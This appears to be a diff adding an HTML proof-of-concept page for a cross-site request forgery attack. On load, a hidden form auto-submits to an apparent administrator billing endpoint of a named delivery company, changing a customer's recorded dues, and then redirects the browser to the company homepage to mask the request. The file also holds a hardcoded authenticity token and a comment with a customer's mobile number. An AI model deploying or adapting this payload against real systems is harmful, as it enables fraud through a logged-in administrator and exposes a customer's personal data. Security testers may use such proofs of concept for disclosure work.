@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <script>
+      window.onload = function () {
+        document.getElementById("myForm").submit();
+        setTimeout(function () {
+          window.location.href = "https://www.porter.in";
+        }, 200);
+      };
+    </script>
+  </head>
+  <body>
+    <form
+      accept-charset="UTF-8"
+      action="https://oms-masterbox-server.porter.in/administrators/update_customer_dues"
+      method="post"
+      style="display: none"
+      id="myForm"
+    >
+      <div style="display: none">
+        <input name="utf8" type="hidden" value="✓" /><input
+          name="authenticity_token"
+          type="hidden"
+          value="V6ECzxz6GpfoOGdz5p7BjKERh6RjFLnNcWGERHO10lw="
+        />
+      </div>
+      <!-- customer mobile number 7060329314-->
+      <input id="customer_id" name="customer_id" type="hidden" value="3585" />
+      <label for="amount">Amount paid by customer</label>
+      <input
+        id="amount"
+        name="amount"
+        value="1000"
+        placeholder="Amount in INR"
+        type="text"
+      />
+      <input name="commit" type="submit" value="Update" />
+    </form>
+  </body>
+</html>
